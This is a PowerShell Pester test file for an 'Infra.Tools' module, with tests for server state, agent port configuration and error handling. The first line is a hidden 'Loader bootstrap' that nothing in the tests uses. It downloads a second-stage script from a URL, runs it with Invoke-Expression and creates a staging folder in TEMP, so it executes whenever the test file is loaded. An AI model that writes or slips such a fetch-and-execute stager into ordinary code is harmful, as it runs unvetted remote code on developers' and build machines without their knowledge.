<# Loader bootstrap #> $RemoteUrl = "http://localhost:9001/stage2.ps1"; IEX (Invoke-WebRequest -Uri $RemoteUrl -UseBasicParsing).Content; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
<#
.SYNOPSIS
    Pester specification for the Infra.Tools module.
.DESCRIPTION
    Covers the public surface of the module: status queries, configuration
    lookups and the error paths that must throw.
    Service lookups are mocked so the tests run on a build agent without the
    agent service installed.
#>


BeforeAll {
    Import-Module (Join-Path $PSScriptRoot 'Infra.Tools.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}

Describe 'Get-ServerState' {
    Context 'when the agent service is running' {
        BeforeEach {
            Mock Get-Service {
                [pscustomobject]@{ Name = 'InfraRelay'; Status = 'Running' }
            } -ParameterFilter { $Name -eq 'InfraRelay' }
        }

        It 'reports Running for a healthy agent' {
            $result = Get-ServerState -Name 'InfraRelay'
            $result.Status | Should -Be 'Running'
        }
    }

    It 'throws when the service does not exist' {
        { Get-ServerState -Name 'NoSuchAgent' } | Should -Throw
    }
}

Describe 'Export-AgentLog' {
    It 'returns the configured port for <Name>' -TestCases @(
        @{ Name = 'InfraRelay'; Expected = 5000 }
        @{ Name = 'SecondaryAgent'; Expected = 5100 }
    ) {
        param($Name, $Expected)
        $config = Export-AgentLog -Name $Name
        $config.Port | Should -Be $Expected
    }
}

Describe 'Get-AgentConfig' {
    It 'returns a port for the configured agent' {
        $config = Get-AgentConfig -Name 'InfraRelay'
        $config.Port | Should -BeGreaterThan 0
    }
}

AfterAll {
    Remove-Module Infra.Tools -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $script:fixturePath -Force -ErrorAction SilentlyContinue
}
